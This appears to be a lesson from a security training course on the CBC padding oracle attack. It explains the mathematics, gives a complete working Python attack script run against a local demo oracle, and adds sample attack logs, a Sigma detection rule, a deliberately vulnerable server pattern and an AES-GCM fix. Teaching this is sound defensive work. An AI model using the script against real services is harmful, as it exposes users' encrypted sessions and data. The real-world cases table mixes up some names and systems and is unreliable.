---
title: "Padding Oracle Attack — CBC Mode Decryption"
tags: [cryptography, padding-oracle, CBC, AES, POODLE, CWE-310, T1600,
  block-cipher, byte-by-byte-decryption, crypto-attacks, module-start]
module: 09-Crypto-01
day: 561
prerequisites:
  - Day 029 — Symmetric Encryption and ECB Weakness
  - Day 030 — Hashing, Collisions and Length Extension
related_topics:
  - Padding Oracle Lab (Day 562)
  - Timing Attacks (Day 563)
  - CBC Cut-and-Paste (Day 566)
---

# Day 561 — Padding Oracle Attack

> "The most elegant attacks in cryptography are not brute force. They are
> gentle — a single yes/no question asked ten thousand times. The padding
> oracle is one yes/no question: 'Is the padding valid?' That is all you
> need to decrypt every byte of every block."
>
> — Ghost

---

## Goals

- Understand the CBC decryption process at the block and byte level.
- Derive why a server that distinguishes between "bad padding" and
  "bad MAC / bad decrypt" leaks information.
- Implement the byte-by-byte padding oracle attack manually (no libraries).
- Map this to POODLE (CVE-2014-3566) and BEAST (CVE-2011-3389).

**Prerequisites:** Day 029 (AES modes, CBC), Day 030 (hashing).
**Estimated study time:** 3 hours.

---

## 1. Recon — How CBC Works

### CBC Encryption

In Cipher Block Chaining mode, each plaintext block is XOR-ed with the
previous ciphertext block before encryption:

```
P₁ XOR IV  → Encrypt(key) → C₁
P₂ XOR C₁  → Encrypt(key) → C₂
P₃ XOR C₂  → Encrypt(key) → C₃
```

### CBC Decryption

Decryption reverses this:

```
C₁ → Decrypt(key) → intermediate₁ XOR IV  → P₁
C₂ → Decrypt(key) → intermediate₂ XOR C₁  → P₂
C₃ → Decrypt(key) → intermediate₃ XOR C₂  → P₃
```

The critical property: **to recover P₂, you XOR intermediate₂ with C₁.**
C₁ is the ciphertext of the previous block — it is visible to the attacker.

### PKCS#7 Padding

Plaintext must be a multiple of the block size (16 bytes for AES).
PKCS#7 padding fills the remaining bytes with the count of padding bytes:

```
If 3 bytes of padding needed: append 0x03 0x03 0x03
If 1 byte needed:             append 0x01
Full block of padding:        append 16×0x10
```

A valid padded block ends with:
```
...X 0x01          (1 byte padding)
...X 0x02 0x02     (2 bytes padding)
...X 0x03 0x03 0x03 (3 bytes padding)
```

---

## 2. Exploit — The Oracle and the Attack

### What Is a Padding Oracle?

A padding oracle is any system that tells you — in any way — whether the
decrypted ciphertext has valid PKCS#7 padding.

The signal can be:
- **Different HTTP status codes:** 200 vs 403 vs 500
- **Different error messages:** "Decryption failed" vs "Invalid session"
- **Different response time** (timing oracle — covered Day 563)
- **Different response body length**

You do not need the key. You need one bit of information per query: valid or
invalid padding.

### The Attack — Byte by Byte

Goal: recover the last byte of plaintext block P₂ by manipulating C₁.

**Setup:**
- You have two consecutive ciphertext blocks: `C₁` and `C₂`.
- The server decrypts `C₂` using the key and XOR's with `C₁` to get `P₂`.
- The server checks: does `P₂` end with valid PKCS#7 padding?

**Attack on the last byte (position 15, 0-indexed):**

```
Intermediate₂[15] = Decrypt(key, C₂)[15]

When server XORs: P₂[15] = Intermediate₂[15] XOR C₁[15]
```

You control C₁. You want P₂[15] = 0x01 (valid 1-byte padding):

```
0x01 = Intermediate₂[15] XOR C₁'[15]
C₁'[15] = Intermediate₂[15] XOR 0x01
```

You do not know `Intermediate₂[15]`. So you bruteforce `C₁'[15]` from 0 to 255.
For each value of `C₁'[15]`, send the modified ciphertext to the oracle.
When the oracle returns "valid padding", you have found the byte where:

```
P₂[15] = 0x01  →  Intermediate₂[15] = C₁'[15] XOR 0x01
```

Now you know `Intermediate₂[15]`. The real plaintext byte is:

```
P₂[15] = Intermediate₂[15] XOR original C₁[15]
```

**Repeat for every byte, working right to left:**

For position 14 (2-byte padding: 0x02 0x02):
- Fix position 15: `C₁'[15] = Intermediate₂[15] XOR 0x02`
- Bruteforce position 14 until oracle says valid padding
- `Intermediate₂[14]` = found_byte XOR 0x02
- `P₂[14]` = `Intermediate₂[14]` XOR `C₁[14]`

### Complexity

16 bytes per block × 256 queries per byte = **4,096 queries maximum** to decrypt
one 16-byte block. In practice, average is ≈ 128 × 16 = 2,048 queries per block.

---

## 3. Minimal Exploit

```python
#!/usr/bin/env python3
"""
padding_oracle_attack.py — byte-by-byte CBC padding oracle implementation
Requires: an oracle function oracle(ciphertext: bytes) -> bool
  Returns True  if decryption produces valid PKCS#7 padding
  Returns False otherwise
"""

def attack(ciphertext: bytes, oracle, block_size: int = 16) -> bytes:
    """Decrypt ciphertext using a padding oracle (no key needed)."""
    assert len(ciphertext) % block_size == 0, "Ciphertext not block-aligned"
    blocks = [ciphertext[i:i+block_size]
              for i in range(0, len(ciphertext), block_size)]
    plaintext = b""

    # Decrypt each block starting from the second (first is IV or C₀)
    for block_idx in range(1, len(blocks)):
        prev_block = bytearray(blocks[block_idx - 1])
        curr_block = blocks[block_idx]
        intermediate = bytearray(block_size)
        decrypted_block = bytearray(block_size)

        # Work from the last byte backwards
        for byte_pos in range(block_size - 1, -1, -1):
            padding_byte = block_size - byte_pos

            # Fix already-known bytes to produce correct padding value
            crafted_prev = bytearray(block_size)
            for k in range(byte_pos + 1, block_size):
                crafted_prev[k] = intermediate[k] ^ padding_byte

            # Bruteforce the current byte (0–255)
            found = False
            for guess in range(256):
                crafted_prev[byte_pos] = guess
                # Craft a two-block ciphertext: crafted_prev || curr_block
                test_ct = bytes(crafted_prev) + bytes(curr_block)
                if oracle(test_ct):
                    # Guard: ensure we have real 1-byte padding, not accidental
                    # multi-byte match (only matters for the last byte)
                    if byte_pos == block_size - 1:
                        crafted_prev[byte_pos - 1] ^= 1
                        if not oracle(bytes(crafted_prev) + bytes(curr_block)):
                            crafted_prev[byte_pos - 1] ^= 1
                            continue
                    intermediate[byte_pos] = guess ^ padding_byte
                    decrypted_block[byte_pos] = (
                        intermediate[byte_pos] ^ prev_block[byte_pos]
                    )
                    found = True
                    break

            if not found:
                raise ValueError(
                    f"Oracle attack failed at block {block_idx}, byte {byte_pos}"
                )

        plaintext += bytes(decrypted_block)
        print(f"[*] Block {block_idx} decrypted: {bytes(decrypted_block)!r}")

    # Strip PKCS#7 padding from final block
    pad_len = plaintext[-1]
    return plaintext[:-pad_len]


# ── Usage example with a local oracle ──────────────────────────────────────
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os

KEY = os.urandom(16)   # Secret key — attacker does NOT know this
IV  = os.urandom(16)

def encrypt(plaintext: bytes) -> bytes:
    """Encrypt with AES-CBC (server-side)."""
    # PKCS#7 pad
    pad_len = 16 - (len(plaintext) % 16)
    plaintext += bytes([pad_len] * pad_len)
    cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV), backend=default_backend())
    enc = cipher.encryptor()
    return IV + enc.update(plaintext) + enc.finalize()

def oracle(ciphertext: bytes) -> bool:
    """Return True if padding is valid (the server's error distinction)."""
    iv_block = ciphertext[:16]
    ct_rest  = ciphertext[16:]
    try:
        cipher = Cipher(algorithms.AES(KEY), modes.CBC(iv_block),
                        backend=default_backend())
        dec = cipher.decryptor()
        pt = dec.update(ct_rest) + dec.finalize()
        # Validate PKCS#7
        pad = pt[-1]
        if pad < 1 or pad > 16:
            return False
        return pt[-pad:] == bytes([pad] * pad)
    except Exception:
        return False

# Test
message = b"Super secret message!"
ciphertext = encrypt(message)
print(f"[+] Ciphertext (hex): {ciphertext.hex()}")

recovered = attack(ciphertext, oracle)
print(f"[+] Recovered plaintext: {recovered!r}")
# → b"Super secret message!"
```

---

## 4. Detect

### What the Oracle Looks Like in Logs

```
# Apache access log — padding oracle attack in progress:
# ~4,096 requests, each with slightly different cookie/token value

10.0.0.5 - - [01/Jan/2024:09:00:01] "GET /profile HTTP/1.1" 500 45
10.0.0.5 - - [01/Jan/2024:09:00:01] "GET /profile HTTP/1.1" 200 892
10.0.0.5 - - [01/Jan/2024:09:00:01] "GET /profile HTTP/1.1" 500 45
10.0.0.5 - - [01/Jan/2024:09:00:02] "GET /profile HTTP/1.1" 500 45
...
# 4,096 requests from the same IP in under 60 seconds
# The same endpoint, different session cookie each time
```

### Sigma Rule

```yaml
title: Padding Oracle Attack Detected
id: c3d4e5f6-a7b8-4c9d-0e1f-2a3b4c5d6e7f
status: experimental
description: >
  High request volume to the same endpoint from one source IP with alternating
  HTTP 500 and 200 responses — characteristic of a padding oracle brute-force.
logsource:
  category: webserver
  product: apache
detection:
  selection:
    status|contains:
      - '500'
    c-ip: '*'
  timeframe: 60s
  condition: selection | count(cs-uri-stem) by c-ip > 200
falsepositives:
  - Load testing tools
level: high
tags:
  - attack.t1600
```

---

## 5. Harden — Fix

#### Vulnerable Pattern

```python
# BAD: server exposes padding error distinctly from decryption error
@app.route('/decrypt')
def decrypt():
    ct = request.cookies.get('session')
    try:
        pt = aes_cbc_decrypt(ct)
    except PaddingError:
        return "Bad padding", 400       # ← Oracle leak: tells attacker padding failed
    except DecryptError:
        return "Decryption failed", 500 # ← Different response = distinguishable
    process(pt)
    return "OK", 200
```

#### Fixed Pattern

```python
# GOOD 1: Authenticate-then-encrypt — use AES-GCM (authenticated)
# An AEAD cipher (GCM, ChaCha20-Poly1305) provides integrity + confidentiality.
# Any tampering causes authentication failure BEFORE decryption.
# No partial decryption ever happens — no padding oracle possible.

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

def encrypt_gcm(plaintext: bytes, key: bytes) -> bytes:
    nonce = os.urandom(12)
    aesgcm = AESGCM(key)
    ct = aesgcm.encrypt(nonce, plaintext, associated_data=None)
    return nonce + ct

def decrypt_gcm(ciphertext: bytes, key: bytes) -> bytes:
    nonce, ct = ciphertext[:12], ciphertext[12:]
    aesgcm = AESGCM(key)
    return aesgcm.decrypt(nonce, ct, associated_data=None)
    # Raises InvalidTag on any tampering — uniform error regardless of cause

# GOOD 2: If you must use CBC, use Encrypt-then-MAC
# HMAC the ciphertext; verify MAC before attempting decryption.
# Reject uniformly (same error, same timing) for both MAC failure
# and padding failure.
```

**The one fix:** Use AES-GCM or ChaCha20-Poly1305. Authenticated encryption
eliminates the oracle entirely. If you inherit a CBC-based system, add HMAC-SHA256
over the ciphertext (Encrypt-then-MAC, not MAC-then-Encrypt) and verify in
constant time before decryption.

---

## Real-World Cases

| CVE | System | Oracle type |
|---|---|---|
| CVE-2014-3566 (POODLE) | SSLv3 CBC fallback | Network padding oracle — forced via BEAST/POODLE downgrade |
| CVE-2011-3389 (BEAST) | TLS 1.0 CBC | Chosen-plaintext + padding oracle on TLS record boundary |
| ASP.NET ViewState | ASP.NET 2.0–4.5 | HTTP 500 vs 200 on ViewState MAC/padding errors |
| Padding Oracle On Downgraded Legacy Encryption | Java keystores | File-based padding oracle |

The ASP.NET ViewState padding oracle (2010) was discovered by Juliano Rizzo
and Thai Duong — the same researchers who found BEAST. It allowed decryption
of any encrypted ViewState and remote code execution in under 30 seconds using
their `padbuster` tool.

---

## Key Takeaways

1. A padding oracle requires only one bit of information: "valid padding?" The
   server does not need to echo the decrypted data. The oracle is the error
   distinction — a behaviour, not a data leak.
2. The fix is not fixing the error message wording. The fix is removing the
   oracle entirely by using authenticated encryption. Equal error messages that
   leak timing are still timing oracles (Day 563).
3. CBC mode without authentication is broken for any application that processes
   attacker-controlled ciphertext. There is no safe way to use unauthenticated
   CBC as a network protocol.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q561.1, Q561.2 …).

---

## Navigation

← Previous: [Day 560 — Red Team Competency Check](../08-RedTeam-03/DAY-0560-Red-Team-Competency-Check.md)
→ Next: [Day 562 — Padding Oracle Lab](DAY-0562-Padding-Oracle-Lab.md)
